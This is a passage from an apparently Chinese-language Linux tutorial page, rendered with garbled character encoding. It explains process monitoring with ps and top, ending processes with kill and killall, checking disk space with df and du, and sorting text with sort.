number">4</span> S     <span class="token number">0</span>     <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> - <span class="token number">26326</span> do_epo ?        00:00:02 systemd<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kthreadd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_par_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 kworker/0:0H-kblockd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kworker/u4:0-events_unbound<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 mm_percpu_wq<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:01 ksoftirqd/0<span class="token number">1</span> I     <span class="token number">0</span>    <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:29 rcu_sched<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> Fï¼šå†…æ ¸åˆ†é…ç»™è¿›ç¨‹çš„ç³»ç»Ÿæ ‡è®°ã€‚</li><li> Sï¼šè¿›ç¨‹çš„çŠ¶æ€ï¼ˆ Oä»£è¡¨æ­£åœ¨è¿è¡Œï¼› Sä»£è¡¨åœ¨ä¼‘çœ ï¼› Rä»£è¡¨å¯è¿è¡Œï¼Œæ­£ç­‰å¾…è¿è¡Œï¼› Zä»£è¡¨åƒµåŒ–ï¼Œè¿›ç¨‹å·²ç»“æŸä½†çˆ¶è¿›ç¨‹å·²ä¸å­˜åœ¨ï¼› Tä»£è¡¨åœæ­¢ï¼‰ã€‚</li><li> PRIï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼ˆè¶Šå¤§çš„æ•°å­—ä»£è¡¨è¶Šä½çš„ä¼˜å…ˆçº§ï¼‰ã€‚</li><li> NIï¼šè°¦è®©åº¦å€¼ç”¨æ¥å‚ä¸å†³å®šä¼˜å…ˆçº§ã€‚</li><li> ADDRï¼šè¿›ç¨‹çš„å†…å­˜åœ°å€ã€‚</li><li> SZï¼šå‡å¦‚è¿›ç¨‹è¢«æ¢å‡ºï¼Œæ‰€éœ€äº¤æ¢ç©ºé—´çš„å¤§è‡´å¤§å°ã€‚</li><li> WCHANï¼šè¿›ç¨‹ä¼‘çœ çš„å†…æ ¸å‡½æ•°çš„åœ°å€ã€‚ </li></ul><h4 id="4-1-2-å®æ—¶æ¢æµ‹è¿›ç¨‹"><a href="#4-1-2-å®æ—¶æ¢æµ‹è¿›ç¨‹" class="headerlink" title="4.1.2 å®æ—¶æ¢æµ‹è¿›ç¨‹"></a>4.1.2 å®æ—¶æ¢æµ‹è¿›ç¨‹</h4><p>pså‘½ä»¤è™½ç„¶åœ¨æ”¶é›†è¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ä¿¡æ¯æ—¶éå¸¸æœ‰ç”¨ï¼Œä½†ä¹Ÿæœ‰ä¸è¶³ä¹‹å¤„ï¼šå®ƒåªèƒ½æ˜¾ç¤ºæŸä¸ªç‰¹å®šæ—¶é—´ ã€‚å¦‚æœæƒ³è§‚å¯Ÿé‚£äº›é¢‘ç¹æ¢è¿›æ¢å‡ºçš„å†…å­˜çš„è¿›ç¨‹è¶‹åŠ¿ï¼Œç”¨pså‘½ä»¤å°±ä¸æ–¹ä¾¿äº†ã€‚  <code>top</code>å‘½ä»¤åˆšå¥½é€‚ç”¨è¿™ç§æƒ…å†µã€‚ topå‘½ä»¤è·Ÿpså‘½ä»¤ç›¸ä¼¼ï¼Œèƒ½å¤Ÿæ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ï¼Œä½†å®ƒæ˜¯å®æ—¶æ˜¾çš„ã€‚  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221838032.png"></p><p>è¾“å‡ºçš„ç¬¬ä¸€éƒ¨åˆ†æ˜¾ç¤ºçš„æ˜¯<font color="#FF5E3A" size="3">ç³»ç»Ÿçš„æ¦‚å†µ</font>ï¼šç¬¬ä¸€è¡Œæ˜¾ç¤ºäº†å½“å‰æ—¶é—´ã€ç³»ç»Ÿçš„è¿è¡Œæ—¶é—´ã€ç™»å½•çš„ç”¨æˆ·æ•°ä»¥åŠç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ã€‚å¹³å‡è´Ÿè½½æœ‰3ä¸ªå€¼ï¼šæœ€è¿‘1åˆ†é’Ÿçš„ã€æœ€è¿‘5åˆ†é’Ÿçš„å’Œæœ€è¿‘15åˆ†é’Ÿçš„å¹³å‡è´Ÿè½½ã€‚å€¼è¶Šå¤§è¯´æ˜ç³»ç»Ÿçš„è´Ÿè½½è¶Šé«˜ã€‚ç”±äºè¿›ç¨‹çŸ­æœŸçš„çªå‘æ€§æ´»åŠ¨ï¼Œå‡ºç°æœ€è¿‘1åˆ†é’Ÿçš„é«˜è´Ÿè½½å€¼ä¹Ÿå¾ˆå¸¸è§ï¼Œä½†å¦‚æœ<strong>è¿‘15åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½éƒ½å¾ˆé«˜ï¼Œå°±è¯´æ˜ç³»ç»Ÿå¯èƒ½æœ‰é—®é¢˜</strong>ã€‚  </p><hr><p>è¯´æ˜:Linuxç³»ç»Ÿç®¡ç†çš„è¦ç‚¹åœ¨äºå®šä¹‰ç©¶ç«Ÿåˆ°ä»€ä¹ˆç¨‹åº¦æ‰ç®—æ˜¯é«˜è´Ÿè½½ã€‚è¿™ä¸ªå€¼å–å†³äºç³»ç»Ÿçš„ç¡¬ä»¶é…ç½®ä»¥åŠç³»ç»Ÿä¸Šé€šå¸¸è¿è¡Œçš„ç¨‹åºã€‚å¯¹æŸä¸ªç³»ç»Ÿæ¥è¯´æ˜¯é«˜è´Ÿè½½çš„å€¼å¯èƒ½å¯¹å¦ä¸€ç³»ç»Ÿæ¥è¯´å°±æ˜¯æ­£å¸¸å€¼ã€‚é€šå¸¸ï¼Œå¦‚æœç³»ç»Ÿçš„<strong>è´Ÿè½½å€¼è¶…è¿‡äº†2</strong>ï¼Œå°±è¯´æ˜ç³»ç»Ÿæ¯”è¾ƒç¹å¿™äº†ã€‚  </p><hr><p>ç¬¬äºŒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹æ¦‚è¦ä¿¡æ¯â€”â€”<font color="#FF5E3A" size="3">topå‘½ä»¤çš„è¾“å‡ºä¸­å°†è¿›ç¨‹å«ä½œä»»åŠ¡ï¼ˆ taskï¼‰</font>ï¼šæœ‰å¤šå°‘è¿›ç¨‹å¤„åœ¨è¿è¡Œã€ä¼‘çœ ã€åœæ­¢æˆ–æ˜¯åƒµåŒ–çŠ¶æ€ï¼ˆåƒµåŒ–çŠ¶æ€æ˜¯æŒ‡è¿›ç¨‹å®Œæˆäº†ï¼Œä½†çˆ¶è¿›ç¨‹æ²¡æœ‰å“åº”ï¼‰ã€‚  </p><p>ç¬¬ä¸‰è¡Œæ˜¾ç¤ºäº†<font color="#FF5E3A" size="3">CPUçš„æ¦‚è¦ä¿¡æ¯</font>ã€‚ topæ ¹æ®è¿›ç¨‹çš„å±ä¸»ï¼ˆç”¨æˆ·è¿˜æ˜¯ç³»ç»Ÿï¼‰å’Œè¿›ç¨‹çš„çŠ¶æ€ï¼ˆè¿è¡Œã€ç©ºé—²è¿˜æ˜¯ç­‰å¾…ï¼‰å°†CPUåˆ©ç”¨ç‡åˆ†æˆå‡ ç±»è¾“å‡ºã€‚ </p><p>ç´§è·Ÿå…¶åçš„ä¸¤è¡Œè¯´æ˜äº†<font color="#FF5E3A" size="3">ç³»ç»Ÿå†…å­˜çš„çŠ¶æ€</font>ã€‚ç¬¬ä¸€è¡Œè¯´çš„æ˜¯ç³»ç»Ÿçš„ç‰©ç†å†…å­˜ï¼šæ€»å…±æœ‰å¤šå°‘å†…å­˜ï¼Œå½“å‰ç”¨äº†å¤šå°‘ï¼Œè¿˜æœ‰å¤šå°‘ç©ºé—²ã€‚åä¸€è¡Œè¯´çš„æ˜¯åŒæ ·çš„ä¿¡æ¯ï¼Œä¸è¿‡æ˜¯é’ˆå¯¹ç³»ç»Ÿäº¤æ¢ç©ºé—´ï¼ˆå¦‚æœåˆ†é…äº†çš„è¯ï¼‰çš„çŠ¶æ€è€Œè¨€çš„ã€‚   </p><p>åä¸€éƒ¨åˆ†æ˜¾ç¤ºäº†å½“å‰è¿è¡Œä¸­çš„è¿›ç¨‹çš„è¯¦ç»†åˆ—è¡¨ï¼Œæœ‰äº›åˆ—è·Ÿpså‘½ä»¤çš„è¾“å‡ºç±»ä¼¼ï¼š</p><ul><li> PIDï¼šè¿›ç¨‹çš„IDã€‚</li><li> USERï¼šè¿›ç¨‹å±ä¸»çš„åå­—ã€‚</li><li> PRï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</li><li> NIï¼šè¿›ç¨‹çš„è°¦è®©åº¦å€¼ã€‚</li><li> VIRTï¼šè¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜æ€»é‡ã€‚</li><li> RESï¼šè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜æ€»é‡ã€‚</li><li> SHRï¼šè¿›ç¨‹å’Œå…¶ä»–è¿›ç¨‹å…±äº«çš„å†…å­˜æ€»é‡ã€‚</li><li> Sï¼šè¿›ç¨‹çš„çŠ¶æ€ï¼ˆ Dä»£è¡¨å¯ä¸­æ–­çš„ä¼‘çœ çŠ¶æ€ï¼Œ Rä»£è¡¨åœ¨è¿è¡ŒçŠ¶æ€ï¼Œ Sä»£è¡¨ä¼‘çœ çŠ¶æ€ï¼Œ Tä»£è¡¨è·Ÿè¸ªçŠ¶æ€æˆ–åœæ­¢çŠ¶æ€ï¼Œ Zä»£è¡¨åƒµåŒ–çŠ¶æ€ï¼Œ<code>I</code>ä»£è¡¨ç©ºé—²çš„ä»»åŠ¡ï¼ˆè¿›ç¨‹ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒæ–°ç‰ˆçš„å†…æ ¸ä¸­æ–°å¢çš„çŠ¶æ€ã€‚ï¼‰</li><li> %CPUï¼šè¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´æ¯”ä¾‹ã€‚</li><li> %MEMï¼šè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜å å¯ç”¨å†…å­˜çš„æ¯”ä¾‹ã€‚  </li><li> TIME+ï¼šè‡ªè¿›ç¨‹å¯åŠ¨åˆ°ç›®å‰ä¸ºæ­¢çš„CPUæ—¶é—´æ€»é‡ã€‚  </li><li> COMMANDï¼šè¿›ç¨‹æ‰€å¯¹åº”çš„å‘½ä»¤è¡Œåç§°ï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨çš„ç¨‹åºåã€‚  </li></ul><p>åœ¨topå‘½ä»¤è¿è¡Œæ—¶é”®å…¥å¯æ”¹å˜topçš„è¡Œä¸ºã€‚é”®å…¥få…è®¸ä½ é€‰æ‹©å¯¹è¾“å‡ºè¿›è¡Œæ’åºçš„å­—æ®µï¼Œé”®å…¥då…è®¸ä½ ä¿®æ”¹è½®è¯¢é—´éš”ã€‚<strong>é”®å…¥qå¯ä»¥é€€å‡ºtop</strong>ã€‚  </p><h4 id="4-1-3-ç»“æŸè¿›ç¨‹"><a href="#4-1-3-ç»“æŸè¿›ç¨‹" class="headerlink" title="4.1.3 ç»“æŸè¿›ç¨‹"></a>4.1.3 ç»“æŸè¿›ç¨‹</h4><p>æœ‰æ—¶è¿›ç¨‹æŒ‚èµ·äº†ï¼Œåªéœ€è¦åŠ¨åŠ¨æ‰‹è®©è¿›ç¨‹é‡æ–°è¿è¡Œæˆ–ç»“æŸå°±è¡Œäº†ã€‚ä½†æœ‰æ—¶ï¼Œæœ‰çš„è¿›ç¨‹ä¼šè€—å°½CPUä¸”ä¸é‡Šæ”¾èµ„æºã€‚åœ¨è¿™ä¸¤ç§æƒ…æ™¯ä¸‹ï¼Œä½ å°±éœ€è¦èƒ½æ§åˆ¶è¿›ç¨‹çš„å‘½ä»¤ã€‚ Linuxæ²¿ç”¨äº†Unixè¿›è¡Œ<font color="#FF5E3A" size="3">è¿›ç¨‹é—´é€šä¿¡çš„æ–¹æ³•</font>ã€‚ åœ¨Linuxä¸­ï¼Œ<font color="#FF5E3A" size="3">è¿›ç¨‹ä¹‹é—´é€šè¿‡ä¿¡å·æ¥é€šä¿¡</font>ã€‚è¿›ç¨‹çš„ä¿¡å·å°±æ˜¯é¢„å®šä¹‰å¥½çš„ä¸€ä¸ªæ¶ˆæ¯ï¼Œ<font color="#FF5E3A" size="3">è¿›ç¨‹èƒ½è¯†åˆ«å®ƒå¹¶å†³å®šå¿½ç•¥è¿˜æ˜¯ä½œå‡ºååº”</font>ã€‚è¿›ç¨‹å¦‚ä½•å¤„ç†ä¿¡å·æ˜¯ç”±å¼€å‘äººå‘˜é€šè¿‡ç¼–ç¨‹æ¥å†³å®šçš„ã€‚å¤§å¤šæ•°ç¼–å†™å®Œå–„çš„ç¨‹åºéƒ½èƒ½æ¥æ”¶å’Œå¤„ç†æ ‡å‡†Unixè¿›ç¨‹ä¿¡å·ã€‚   </p><table><thead><tr><th align="center">ä¿¡å·</th><th align="center">åç§°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">HUP</td><td align="center">æŒ‚èµ·</td></tr><tr><td align="center">2</td><td align="center">INT</td><td align="center">ä¸­æ–­</td></tr><tr><td align="center">3</td><td align="center">QUIT</td><td align="center">ç»“æŸè¿è¡Œ</td></tr><tr><td align="center">9</td><td align="center">KILL</td><td align="center">æ— æ¡ä»¶ç»ˆæ­¢</td></tr><tr><td align="center">11</td><td align="center">SEGV</td><td align="center">æ®µé”™è¯¯</td></tr><tr><td align="center">15</td><td align="center">TERM</td><td align="center">å°½å¯èƒ½ç»ˆæ­¢</td></tr><tr><td align="center">17</td><td align="center">STOP</td><td align="center">æ— æ¡ä»¶åœæ­¢è¿è¡Œï¼Œä½†ä¸ç»ˆæ­¢</td></tr><tr><td align="center">18</td><td align="center">TSTP</td><td align="center">åœæ­¢æˆ–æš‚åœï¼Œä½†ç»§ç»­åœ¨åå°è¿è¡Œ</td></tr><tr><td align="center">19</td><td align="center">CONT</td><td align="center">åœ¨STOPæˆ–TSTPä¹‹åæ¢å¤æ‰§è¡Œ</td></tr></tbody></table><p><code>killå‘½ä»¤</code> ï¼š</p><p>è¦å‘é€è¿›ç¨‹ä¿¡å·ï¼Œä½ <font color="#FF5E3A" size="3">å¿…é¡»æ˜¯è¿›ç¨‹çš„å±ä¸»æˆ–ç™»å½•ä¸ºrootç”¨æˆ·</font>ã€‚  killå‘½ä»¤å¯é€šè¿‡è¿›ç¨‹IDï¼ˆ PIDï¼‰ç»™è¿›ç¨‹å‘ä¿¡å·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ killå‘½ä»¤ä¼šå‘å‘½ä»¤è¡Œä¸­åˆ—å‡ºçš„å…¨éƒ¨PIDå‘é€ä¸€ä¸ªTERMä¿¡å·ã€‚é—æ†¾çš„æ˜¯ï¼Œä½ åªèƒ½ç”¨è¿›ç¨‹çš„PIDè€Œä¸èƒ½ç”¨å‘½ä»¤åï¼Œæ‰€ä»¥killå‘½ä»¤æœ‰æ—¶å¹¶ä¸å¥½ç”¨ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">kill</span> <span class="token number">3940</span>-bash: kill: <span class="token punctuation">(</span><span class="token number">3940</span><span class="token punctuation">)</span> - Operation not permitted$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>TERMä¿¡å·å‘Šè¯‰è¿›ç¨‹å¯èƒ½çš„è¯å°±åœæ­¢è¿è¡Œã€‚ä¸è¿‡ï¼Œå¦‚æœæœ‰ä¸æœç®¡æ•™çš„è¿›ç¨‹ï¼Œé‚£å®ƒé€šå¸¸<strong>ä¼šå¿½ç•¥è¿™ä¸ªè¯·æ±‚</strong>ã€‚å¦‚æœè¦å¼ºåˆ¶ç»ˆæ­¢ï¼Œ -så‚æ•°æ”¯æŒæŒ‡å®šå…¶ä»–ä¿¡å·ï¼ˆç”¨ä¿¡å·åæˆ–ä¿¡å·å€¼ï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># kill -s HUP 3940</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹å‡ºkillå‘½ä»¤ä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚ è¦<strong>æ£€æŸ¥killå‘½ä»¤æ˜¯å¦æœ‰æ•ˆï¼Œå¯å†è¿è¡Œpsæˆ–topå‘½ä»¤</strong>ï¼Œçœ‹çœ‹é—®é¢˜è¿›ç¨‹æ˜¯å¦å·²åœæ­¢ã€‚ </p><p><code>killall</code>å‘½ä»¤ï¼š</p><p>killallå‘½ä»¤æ”¯æŒé€šè¿‡è¿›ç¨‹åè€Œä¸æ˜¯PIDæ¥ç»“æŸè¿›ç¨‹ã€‚ killallå‘½ä»¤ä¹Ÿæ”¯æŒé€šé…ç¬¦ï¼Œè¿™åœ¨ç³»ç»Ÿå› è´Ÿè½½è¿‡å¤§è€Œå˜å¾—å¾ˆæ…¢æ—¶å¾ˆæœ‰ç”¨ã€‚   </p><hr><p><font color="red" size="3">è­¦å‘Š</font> ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•ç³»ç»Ÿæ—¶ï¼Œä½¿ç”¨killallå‘½ä»¤è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºå¾ˆå®¹æ˜“å°±ä¼šè¯¯ç”¨é€šé…ç¬¦è€Œç»“æŸäº†é‡è¦çš„ç³»ç»Ÿè¿›ç¨‹ã€‚è¿™å¯èƒ½ä¼šç ´åæ–‡ä»¶ç³»ç»Ÿã€‚</p><hr><h3 id="4-2-ç›‘æµ‹ç£ç›˜ç©ºé—´"><a href="#4-2-ç›‘æµ‹ç£ç›˜ç©ºé—´" class="headerlink" title="4.2 ç›‘æµ‹ç£ç›˜ç©ºé—´"></a>4.2 ç›‘æµ‹ç£ç›˜ç©ºé—´</h3><h4 id="4-2-1-df-å‘½ä»¤"><a href="#4-2-1-df-å‘½ä»¤" class="headerlink" title="4.2.1 df å‘½ä»¤"></a>4.2.1 <code>df </code>å‘½ä»¤</h4><p>dfå‘½ä»¤å¯ä»¥æ–¹ä¾¿åœ°æŸ¥çœ‹æ‰€æœ‰<strong>å·²æŒ‚è½½ç£ç›˜</strong>çš„ä½¿ç”¨æƒ…å†µã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span>Filesystem     1K-blocks    Used Available Use% Mounted onudev             <span class="token number">1939124</span>       <span class="token number">0</span>   <span class="token number">1939124</span>   <span class="token number">0</span>% /devtmpfs             <span class="token number">391044</span>   <span class="token number">39556</span>    <span class="token number">351488</span>  <span class="token number">11</span>% /run/dev/vda1       <span class="token number">82503044</span> <span class="token number">5996440</span>  <span class="token number">73051148</span>   <span class="token number">8</span>% /tmpfs            <span class="token number">1955208</span>      <span class="token number">32</span>   <span class="token number">1955176</span>   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> è®¾å¤‡çš„è®¾å¤‡æ–‡ä»¶ä½ç½®ï¼›</li><li> èƒ½å®¹çº³å¤šå°‘ä¸ª1024å­—èŠ‚å¤§å°çš„å—ï¼›</li><li> å·²ç”¨äº†å¤šå°‘ä¸ª1024å­—èŠ‚å¤§å°çš„å—ï¼›</li><li> è¿˜æœ‰å¤šå°‘ä¸ª1024å­—èŠ‚å¤§å°çš„å—å¯ç”¨ï¼›</li><li> å·²ç”¨ç©ºé—´æ‰€å çš„æ¯”ä¾‹ï¼›</li><li> è®¾å¤‡æŒ‚è½½åˆ°äº†å“ªä¸ªæŒ‚è½½ç‚¹ä¸Š  </li></ul><p>ä¸€ä¸ªå¸¸ç”¨çš„å‚æ•°æ˜¯<code>-h</code>ã€‚å®ƒä¼šæŠŠè¾“å‡ºä¸­çš„ç£ç›˜ç©ºé—´æŒ‰ç…§ç”¨æˆ·æ˜“è¯»çš„å½¢å¼æ˜¾ç¤ºï¼Œé€šå¸¸ç”¨Mæ¥æ›¿ä»£å…†å­—èŠ‚ï¼Œç”¨Gæ›¿ä»£å‰å­—èŠ‚ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span> -hFilesystem      Size  Used Avail Use% Mounted onudev            <span class="token number">1</span>.9G     <span class="token number">0</span>  <span class="token number">1</span>.9G   <span class="token number">0</span>% /devtmpfs           382M   39M  344M  <span class="token number">11</span>% /run/dev/vda1        79G  <span class="token number">5</span>.8G   70G   <span class="token number">8</span>% /tmpfs           <span class="token number">1</span>.9G   32K  <span class="token number">1</span>.9G   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-2-duå‘½ä»¤"><a href="#4-2-2-duå‘½ä»¤" class="headerlink" title="4.2.2 duå‘½ä»¤"></a>4.2.2 <code>du</code>å‘½ä»¤</h4><p>duå‘½ä»¤å¯ä»¥æ˜¾ç¤ºæŸä¸ªç‰¹å®šç›®å½•ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯å½“å‰ç›®å½•ï¼‰çš„ç£ç›˜ä½¿ç”¨æƒ…å†µã€‚è¿™ä¸€æ–¹æ³•å¯ç”¨æ¥å¿«é€Ÿåˆ¤æ–­ç³»ç»Ÿä¸ŠæŸä¸ªç›®å½•ä¸‹æ˜¯ä¸æ˜¯æœ‰è¶…å¤§æ–‡ä»¶ã€‚  </p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ duå‘½ä»¤ä¼šæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ã€ç›®å½•å’Œå­ç›®å½•çš„ç£ç›˜ä½¿ç”¨æƒ…å†µï¼Œå®ƒä¼šä»¥ç£ç›˜å—ä¸ºå•ä½æ¥è¡¨æ˜æ¯ä¸ªæ–‡ä»¶æˆ–ç›®å½•å ç”¨äº†å¤šå¤§å­˜å‚¨ç©ºé—´ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">du</span><span class="token number">484</span> ./.gstreamer-0.10<span class="token number">8</span> ./Templates<span class="token number">8</span> ./Download<span class="token number">8</span> ./.ccache/7/0<span class="token number">24</span> ./.ccache/7<span class="token number">368</span> ./.ccache/a/d<span class="token number">384</span> ./.ccache/a<span class="token number">424</span> ./.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯è¡Œè¾“å‡ºå·¦è¾¹çš„æ•°å€¼æ˜¯æ¯ä¸ªæ–‡ä»¶æˆ–ç›®å½•å ç”¨çš„<strong>ç£ç›˜å—æ•°</strong>ã€‚åˆ—è¡¨æ˜¯ä»ç›®å½•å±‚çº§çš„<strong>æœ€åº•éƒ¨å¼€å§‹</strong>ï¼Œç„¶åæŒ‰æ–‡ä»¶ã€å­ç›®å½•ã€ç›®å½•é€çº§å‘ä¸Šã€‚  åŒç†ï¼Œä¹Ÿæœ‰<code>-h</code>å‚æ•°æŒ‰ç”¨æˆ·æ˜“è¯»çš„æ ¼å¼è¾“å‡ºå¤§å° ã€‚</p><h3 id="4-3-å¤„ç†æ•°æ®æ–‡ä»¶"><a href="#4-3-å¤„ç†æ•°æ®æ–‡ä»¶" class="headerlink" title="4.3 å¤„ç†æ•°æ®æ–‡ä»¶"></a>4.3 å¤„ç†æ•°æ®æ–‡ä»¶</h3><h4 id="4-3-1-æ’åºæ•°æ®"><a href="#4-3-1-æ’åºæ•°æ®" class="headerlink" title="4.3.1 æ’åºæ•°æ®"></a>4.3.1 æ’åºæ•°æ®</h4><p><code>sort</code>å‘½ä»¤æŒ‰ç…§ä¼šè¯æŒ‡å®šçš„é»˜è®¤è¯­è¨€çš„æ’åºè§„åˆ™å¯¹æ–‡æœ¬æ–‡ä»¶ä¸­çš„æ•°æ®è¡Œæ’åºã€‚ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1onetwothreefourfive$ <span class="token function">sort</span> file1fivefouronethreetwo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> ä½†æ˜¯å¦‚æœå¯¹æ•°å­—è¿›è¡Œæ’åºï¼Œå¯èƒ½ä¼šå‡ºç‚¹å·®é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file2<span class="token number">1</span><span class="token number">2</span><span class="token number">100</span><span class="token number">45</span><span class="token number">3</span><span class="token number">10</span><span class="token number">145</span>$ <span class="token function">sort</span> file2<span class="token number">1</span><span class="token number">10</span><span class="token number">100</span><span class="token number">145</span><span class="token number">2</span><span class="token number">3</span><span class="token number">45</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ sortå‘½ä»¤ä¼šæŠŠ<strong>æ•°å­—å½“åšå­—ç¬¦æ¥æ‰§è¡Œ</strong>æ ‡å‡†çš„å­—ç¬¦æ’åºã€‚è§£å†³è¿™ä¸ªé—®é¢˜å¯ç”¨-nå‚æ•° ï¼Œå‘Šè¯‰sortå‘½ä»¤æŠŠæ•°å­—è¯†åˆ«æˆæ•°å­—è€Œä¸æ˜¯å­—ç¬¦ï¼Œå¹¶ä¸”æŒ‰å€¼æ’åº  ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -n file2<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">10</span><span class="token number">45</span><span class="token number">100</span><span class="token number">145</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦ä¸€ä¸ªå¸¸ç”¨çš„å‚æ•°æ˜¯-Mï¼ŒæŒ‰æœˆæ’åºã€‚ Linuxçš„<strong>æ—¥å¿—æ–‡ä»¶</strong>ç»å¸¸ä¼šåœ¨æ¯è¡Œçš„<strong>èµ·å§‹ä½ç½®æœ‰ä¸€ä¸ªæ—¶é—´æˆ³</strong>ï¼Œç”¨æ¥è¡¨æ˜äº‹ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™å‘ç”Ÿçš„ã€‚å¦‚æœç”¨-Må‚æ•°ï¼Œ sortå‘½ä»¤å°±èƒ½è¯†åˆ«ä¸‰å­—ç¬¦çš„æœˆä»½åï¼Œå¹¶ç›¸åº”åœ°æ’åºã€‚   </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Sep <span class="token number">13</span> 07:10:09 testbox smartd<span class="token punctuation">[</span><span class="token number">2718</span><span class="token punctuation">]</span>: Device: /dev/sda, opened  <span class="token comment">#æ—¥å¿—æ–‡ä»¶</span>$ <span class="token function">sort</span> -M file3JanFebMarApr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¸¸ç”¨å‚æ•°ï¼š</p><table><thead><tr><th align="center">å‚æ•°</th><th align="center">æ è¿°</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">å‚æ•°ä¼šå¿½ç•¥å¤§å°å†™</td></tr><tr><td align="center">-r</td><td align="center">ååºæ’åºï¼ˆå‡åºå˜æˆé™åºï¼‰</td></tr><tr><td align="center">-t</td><td align="center">æŒ‡å®šä¸€ä¸ªç”¨æ¥åŒºåˆ†é”®ä½ç½®çš„å­—ç¬¦</td></tr><tr><td align="center">-n</td><td align="center">æŒ‰å­—ç¬¦ä¸²æ•°å€¼æ¥æ’åºï¼ˆå¹¶ä¸è½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼‰</td></tr><tr><td align="center">-g</td><td 